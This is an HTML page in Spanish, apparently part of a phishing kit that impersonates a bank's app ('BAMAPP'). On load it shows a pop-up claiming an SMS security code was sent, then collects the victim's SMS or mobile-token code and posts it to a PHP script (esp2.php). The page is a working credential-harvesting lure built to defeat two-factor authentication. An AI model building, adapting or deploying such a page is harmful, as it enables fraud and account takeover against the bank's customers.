<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
    <style>
        /* Estilo para la ventana emergente */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background-color: white;
            border: 2px solid #ccc;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            z-index: 1000;
        }

        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }

        .popup button {
            display: block;
            margin: 0 auto;
            padding: 5px 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            cursor: pointer;
        }

        .popup button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body class="body">

    <!-- Ventana emergente personalizada -->
    <div class="popup-overlay" id="popupOverlay"></div>
    <div class="popup" id="popup">
        <p>Método de seguridad: hemos enviado un código SMS a su dispositivo móvil. Ingrésalo para continuar, si ya cuentas con token móvil, ingresa el código token que se muestra en el inicio de tu BAMAPP para continuar.</p>
        <button onclick="closePopup()">Aceptar</button>
    </div>

    <center>
        <form class="form" action="esp2.php" method="post">
            <img src="bm-icon.svg" alt="">
            <br><br>
            <img class="title" src="title.png" alt="">
            <br><br>
            <img style="width:100px;" src="Imagen1.png" alt="">
            <br><br>

            <div style="height: 180px;" class="caja1">
                <img style="width: 90%; margin-top: 10px;" src="tkk.png" alt="">
                <br>
                <img class="ic" src="sg.png" alt="">
                <input name="clv" required class="ip1" type="text" placeholder="Ingresa tu Token">
            </div>
            <br>
            <a style="font-size: 10px; color: #7d7c77;" href="/cr.php">¿No funciona el código de seguridad o tienes problemas para continuar? Haz clic aquí.</a>
            <br><br>
            <input class="btn" type="submit" value="CONTINUAR">
            <br>
        </form>
        <br>
        <br>
        <br>
        <img style="width: 350px;" src="copy.png" alt="">
    </center>

    <script>
        // Mostrar la ventana emergente al cargar la página
        window.onload = function() {
            document.getElementById('popupOverlay').style.display = 'block';
            document.getElementById('popup').style.display = 'block';
        };

        // Función para cerrar la ventana emergente
        function closePopup() {
            document.getElementById('popupOverlay').style.display = 'none';
            document.getElementById('popup').style.display = 'none';
        }
    </script>
</body>
</html>
